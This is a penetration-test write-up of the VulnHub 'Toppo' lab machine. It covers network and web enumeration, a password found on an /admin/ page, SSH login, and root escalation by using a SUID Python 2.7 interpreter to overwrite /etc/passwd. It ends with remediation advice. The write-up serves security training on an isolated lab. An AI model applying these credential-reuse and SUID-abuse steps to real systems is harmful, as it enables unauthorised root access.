My IP-address  - 192.168.96.3
Target IP-address - 192.168.96.21

---

Tools:
- arp-scan
- nmap
- ffuf

# 📝 Penetration Testing Report

# 🎯 VulnHub — Toppo

> **📌 Platform:** VulnHub  
> **🖥️ Target Machine:** Toppo  
> **💻 Attacking Machine:** Kali Linux  
> **🌐 Environment:** Oracle VirtualBox (Host-Only Network)

---

# 📖 Executive Summary

The objective of this assessment was to perform a penetration test against the **Toppo** virtual machine in order to identify exposed services, discover potential attack vectors, obtain initial access, escalate privileges, and demonstrate full system compromise.

The assessment followed a structured methodology:

- Network reconnaissance
    
- Service enumeration
    
- Web enumeration
    
- Information disclosure analysis
    
- Credential discovery
    
- SSH authentication
    
- Local privilege enumeration
    
- SUID enumeration
    
- Privilege escalation
    
- Post-exploitation
    

The system was successfully compromised, resulting in **root-level access**.

---

# 💡 Skills Demonstrated

- 🌐 Network Reconnaissance
    
- 🔍 Service Enumeration
    
- 🏷️ Banner Analysis
    
- 🌐 Web Enumeration
    
- 📂 Directory Enumeration
    
- 🔐 Credential Discovery
    
- 🔑 SSH Authentication
    
- 🐧 Linux Local Enumeration
    
- 🔎 SUID Enumeration
    
- ⬆️ Privilege Escalation
    
- 👑 Root Access
    
- 📝 Security Reporting
    

---

# 🖥️ Lab Environment

```text
Kali Linux
      │
      │ Host-Only Network
      │
    Toppo
```


---

# 🛣️ Attack Path

```text
🛰️ Host Discovery
        │
        ▼
🔍 Port & Service Enumeration
        │
        ▼
🌐 HTTP Enumeration
        │
        ▼
📂 Directory Discovery
        │
        ▼
🔎 Information Disclosure
        │
        ▼
🔐 Credential Discovery
        │
        ▼
🔑 SSH Authentication
        │
        ▼
🐧 Local Enumeration
        │
        ▼
🔎 SUID Enumeration
        │
        ▼
⬆️ Privilege Escalation
        │
        ▼
👑 Root Access
        │
        ▼
🏆 Flag Retrieval
```

---

# 🛰️ 1. Host Discovery

## 🎯 Objective

Identify the IP address of the target system within the isolated laboratory network.

## 🤔 Methodology

Since the target was deployed in a **VirtualBox Host-Only Network**, ARP scanning was used to identify active hosts.

```bash
sudo arp-scan -I eth1 192.168.96.0/24
```

The scan identified the target:

```text
192.168.96.21
```

### 🔎 Analysis

After identifying the target IP address, the next step was to determine the available network services and build an initial attack surface.

---

# 🔍 2. Service Enumeration

## 🎯 Objective

Identify open ports, running services, and software versions.

## 🤔 Methodology

An aggressive Nmap scan was performed to obtain service versions and additional information.

```bash
sudo nmap -sV -A 192.168.96.21
```

The following services were identified:

|🔌 Port|🛠️ Service|📌 Version|
|---|---|---|
|22/tcp|SSH|OpenSSH 6.7p1 Debian 5+deb8u4|
|80/tcp|HTTP|Apache 2.4.10|
|111/tcp|RPCBind|2–4|

Nmap also identified the following HTTP information:

```text
Apache/2.4.10 (Debian)
Clean Blog - Start Bootstrap Theme
```

The HTTP enumeration scripts identified several potentially interesting resources:

```text
/admin/
/mail/
/css/
/img/
/js/
/manual/
/vendor/
```

SSH supported both public-key and password authentication.

### 🔎 Analysis

The HTTP service immediately appeared to be the most promising attack vector because it exposed several potentially interesting directories.

At this stage, the primary hypothesis became:

```text
HTTP → Information Disclosure → Credentials → SSH
```

Therefore, further enumeration was focused on ports **80/tcp** and **22/tcp**.

---

# 🌐 3. HTTP Enumeration

## 🎯 Objective

Identify hidden directories, files, and potentially sensitive information exposed by the web server.

## 🤔 Methodology

The information discovered by Nmap was independently verified using **FFUF**.

```bash
ffuf -u http://192.168.96.21/FUZZ \
-w /usr/share/wordlists/dirb/common.txt
```

The following resources were identified:

```text
/admin
/css
/img
/index.html
/js
/LICENSE
/mail
/manual
/server-status
/vendor
```

### 🔎 Analysis

The results confirmed the findings from Nmap.

Of particular interest was the `/admin/` directory.

The next step was to manually investigate the discovered directories.

---

# 📂 4. Analysis of the `/admin/` Directory

## 🎯 Objective

Investigate the administrative directory for information that could facilitate further access.

The following resource was discovered under:

```text
http://192.168.96.21/admin/
```

The page contained the following message:

```text
I need to change my password :/
12345ted123 is too outdated but the technology isn't my thing
i prefer go fishing or watching soccer.
```

### 🔎 Analysis

The message disclosed what appeared to be a password:

```text
12345ted123
```

It also contained a potential username clue:

```text
Ted
```

Based on this information, a potential credential pair was identified:

```text
Username: ted
Password: 12345ted123
```

Because SSH was exposed and supported password authentication, these credentials were tested against the SSH service.

---

# 🔑 5. Initial Access via SSH

## 🎯 Objective

Validate the discovered credentials and obtain an authenticated user session.

The discovered credentials were used to authenticate to SSH:

```bash
ssh ted@192.168.96.21
```

Authentication was successful.

After obtaining access, basic system enumeration was performed:

```bash
id
pwd
hostname
sudo -l
```

### 🔎 Analysis

The credentials disclosed through the web server provided valid SSH access.

However, the user did not initially possess unrestricted administrative privileges.

Therefore, the next phase focused on local privilege enumeration.

---

# 🐧 6. Local Enumeration

## 🎯 Objective

Identify potential mechanisms for privilege escalation.

One of the first checks performed was enumeration of SUID-enabled binaries.

```bash
find / -perm -4000 -type f 2>/dev/null
```

Among the discovered binaries were:

```text
/usr/bin/python2.7
/usr/bin/passwd
```


### 🔎 Analysis

The presence of **Python 2.7 with the SUID permission** was particularly interesting because SUID allows a binary to execute with the privileges of its file owner.

Since the binary was owned by `root`, this presented a potential privilege-escalation path.

Further investigation was performed to determine whether Python could be abused to execute commands with elevated privileges.

---

# ⬆️ 7. Privilege Escalation

## 🎯 Objective

Escalate from the `ted` user to `root`.

Before attempting exploitation, the permissions and location of the `cp` utility were examined:

```bash
which cp
```

```bash
ls -la /bin/cp
```

The attack was based on abusing the SUID-enabled Python interpreter to execute a command with elevated privileges.

First, a copy of the `/etc/passwd` file was created in `/tmp`:

```text
/tmp/passwd
```

The file was then modified and prepared for replacement.

Python 2.7 was subsequently executed from the `/etc` directory:

```python
import os

os.system("cp /tmp/passwd .")
```

### 🔎 Analysis

Because Python 2.7 was configured with the SUID bit and owned by `root`, the command executed through Python inherited elevated privileges.

This allowed the modified `/etc/passwd` file to replace the original system file.

After reconnecting as `ted`, the resulting configuration provided access with root privileges.


---

# 👑 8. Post-Exploitation

## 🎯 Objective

Confirm complete compromise of the target system and retrieve the laboratory flag.

After obtaining elevated access, the root directory was examined.

```bash
cd /root
```

The following file was discovered:

```text
flag.txt
```

The contents confirmed successful completion of the machine:

```text
Congratulations ! there is your flag :
0wnedlab{p4ssi0n_c0me_with_pract1ce}
```

---

# ⚠️ Identified Vulnerabilities

|⚠️ Finding|📊 Risk|
|---|---|
|Sensitive information disclosure through `/admin/`|🟠 High|
|Password disclosed through a web-accessible resource|🔴 Critical|
|Password-based SSH authentication|🟠 High|
|SUID-enabled Python 2.7|🔴 Critical|
|Privilege escalation to root|🔴 Critical|
|Use of outdated Python 2.7|🟠 High|

---

# 🛡️ Recommendations

### 🔐 Credential Security

- Remove credentials and passwords from publicly accessible web resources.
    
- Enforce strong password policies.
    
- Avoid reusing credentials across services.
    
- Consider disabling password-based SSH authentication where possible.
    

### 🌐 Web Security

- Remove sensitive information from administrative pages.
    
- Restrict access to administrative directories.
    
- Review web server content for accidental information disclosure.
    

### 🐧 Linux Security

- Remove unnecessary SUID permissions.
    
- Never configure interpreters such as Python with unnecessary SUID privileges.
    
- Regularly audit SUID/SGID binaries.
    
- Remove obsolete software such as Python 2.7.
    

---

# 📊 Attack Summary

|Stage|Result|
|---|---|
|🛰️ Host Discovery|✅ Successful|
|🔍 Service Enumeration|✅ Successful|
|🌐 HTTP Enumeration|✅ Successful|
|📂 Directory Discovery|✅ Successful|
|🔎 Information Disclosure|✅ Successful|
|🔑 Credential Discovery|✅ Successful|
|🖥️ SSH Access|✅ Successful|
|🐧 Local Enumeration|✅ Successful|
|⬆️ Privilege Escalation|✅ Successful|
|👑 Root Access|✅ Successful|
|🏆 Flag Retrieval|✅ Successful|

---

# ✅ Conclusion

The **Toppo** machine was successfully compromised through a multi-stage attack chain.

The initial access was obtained by combining:

- HTTP directory enumeration;
    
- information disclosure through the `/admin/` resource;
    
- discovery of valid credentials;
    
- SSH authentication.
    

Privilege escalation was then achieved by identifying a **SUID-enabled Python 2.7 interpreter** and abusing its elevated execution context.